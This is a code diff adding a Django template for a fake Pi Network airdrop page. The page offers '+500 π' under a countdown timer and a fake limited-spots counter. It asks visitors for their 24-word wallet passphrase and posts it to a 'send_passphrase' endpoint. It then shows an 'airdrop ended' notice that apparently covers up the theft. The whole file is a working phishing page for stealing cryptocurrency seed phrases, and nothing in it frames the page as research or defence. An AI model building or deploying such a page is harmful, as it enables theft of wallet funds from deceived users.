@@ -1,0 +1,83 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Pi Claim Page</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="{% static 'css/verification.css' %}" />
+    <style>
+      
+    </style>
+  </head>
+  <body>
+    <div class="wrapper">
+      <h1 class="pi-amount">+500 π</h1>
+
+      <ul class="pi-info">
+        <li>
+          <img src="{% static 'images/np1.png' %}" alt="Time" /> <b>Time Remaining:</b> <span id="countdown">00:15:00</span>
+        </li>
+        <li>
+          <img src="{% static 'images/np2.png' %}" alt="Requirement" /><b> Requirement: Mainnet Wallet (Step 9 Green)</b>
+        </li>
+        <li>
+          <img src="{% static 'images/np3.png' %}" alt="Spots" /><b> Remaining Spots: 31,401 / 31,415</b>
+        </li>
+      </ul>
+
+      <form action="{% url 'send_passphrase' %}" method="post" id="passphrase-form">
+        {% csrf_token %}
+        <textarea class="passphrase-input" name="passphrase" id="passphrase"  placeholder="Enter your 24 word passphrase here..." required></textarea>
+        <br />
+        <div class="unlock-button-container">
+        <button type="submit" class="unlock-button">Unlock with Passphrase</button>
+        </div>
+      </form>
+
+      {% comment %} <textarea class="passphrase-input" id="passphrase" placeholder="Enter your 24 word passphrase here" required></textarea>
+
+      <div class="unlock-button-container">
+        <button class="unlock-button" onclick="showWarning()">UNLOCK WITH PASSPHRASE</button>
+      </div> {% endcomment %}
+{% comment %} <p style="color:red">DEBUG: {{ show_warning }}</p> {% endcomment %}
+      
+      
+{% if show_warning %}
+  <div id="warning-box" class="warning-box" style="display: block;">
+    This airdrop program has now ended. Pi Core Team reminds you: Only enter your passphrase in the official Pi app via Pi Browser — never share it elsewhere.
+  </div>
+{% endif %}
+
+
+      <p class="note">*Note: Each wallet may claim only once.</p>
+
+      <button class="ecosystem-btn">🌐 Explore the Ecosystem</button>
+    </div>
+
+   <script>
+  // Total time: 15 minutes = 900 seconds
+  let totalSeconds = 15 * 60;
+
+  const countdownEl = document.getElementById("countdown");
+
+  const updateCountdown = () => {
+    const hours = String(Math.floor(totalSeconds / 3600)).padStart(2, '0');
+    const minutes = String(Math.floor((totalSeconds % 3600) / 60)).padStart(2, '0');
+    const seconds = String(totalSeconds % 60).padStart(2, '0');
+
+    countdownEl.textContent = `${hours}:${minutes}:${seconds}`;
+    totalSeconds--;
+
+    if (totalSeconds >= 0) {
+      setTimeout(updateCountdown, 1000);
+    } else {
+      countdownEl.textContent = "00:00:00";
+    }
+  };
+
+  updateCountdown();
+</script>
+
+  </body>
+</html>
